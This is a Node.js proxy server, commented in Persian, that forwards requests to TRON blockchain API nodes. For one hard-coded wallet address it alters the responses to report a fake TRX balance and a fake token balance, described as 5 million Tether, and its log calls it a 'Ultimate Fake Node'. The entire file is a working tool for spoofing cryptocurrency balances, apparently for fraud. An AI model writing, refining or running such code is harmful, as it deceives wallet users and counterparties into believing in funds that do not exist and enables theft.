const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
app.use(cors());
app.use(express.json());

// ==================== تنظیمات ====================
// استفاده از نود جایگزین (European node)
const REAL_NODE = 'https://api.trongrid.io';
const BACKUP_NODE = 'https://trx.nownodes.io';  // نود جایگزین

const FAKE_BALANCES = {
    'TNB2L2tFDsZZzxjXRQksnoso4dS1s25xi2': '5000000000000',  // ۵ میلیون تتر
};
// =================================================

function injectFakeBalance(data, address) {
    if (!data || typeof data !== 'object') return data;
    
    if (data.balance && data.address) {
        if (FAKE_BALANCES[data.address]) {
            data.balance = FAKE_BALANCES[data.address];
        }
    }
    
    if (Array.isArray(data.trc20)) {
        data.trc20 = data.trc20.map(token => {
            if (token.contract === 'TPHjxwvDiAJtnySMo99ou7Rbqo8cqVhsh') {
                const addr = data.address || data.owner;
                if (addr && FAKE_BALANCES[addr]) {
                    token.balance = FAKE_BALANCES[addr];
                    token.amount = FAKE_BALANCES[addr];
                }
            }
            return token;
        });
    }
    
    return data;
}

app.use('/', async (req, res) => {
    try {
        // تلاش با نود اصلی
        let targetUrl = REAL_NODE + req.url;
        let response;
        try {
            response = await axios({
                method: req.method,
                url: targetUrl,
                headers: req.headers,
                data: req.body,
                timeout: 5000
            });
        } catch (e) {
            // در صورت خطا، از نود پشتیبان استفاده کن
            console.log('🔄 استفاده از نود پشتیبان...');
            targetUrl = BACKUP_NODE + req.url;
            response = await axios({
                method: req.method,
                url: targetUrl,
                headers: req.headers,
                data: req.body,
                timeout: 10000
            });
        }
        
        let modifiedData = response.data;
        if (req.query.address || req.body.address) {
            const address = req.query.address || req.body.address;
            modifiedData = injectFakeBalance(modifiedData, address);
        }
        
        res.status(response.status).json(modifiedData);
    } catch (error) {
        console.error('❌ خطا:', error.message);
        res.status(500).json({
            error: 'Network error',
            details: error.message
        });
    }
});

const PORT = 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🔥 Ultimate Fake Node is running on port ${PORT}`);
    console.log(`🎯 Fake balance set for: TNB2L2tFDsZZzxjXRQksnoso4dS1s25xi2`);
});
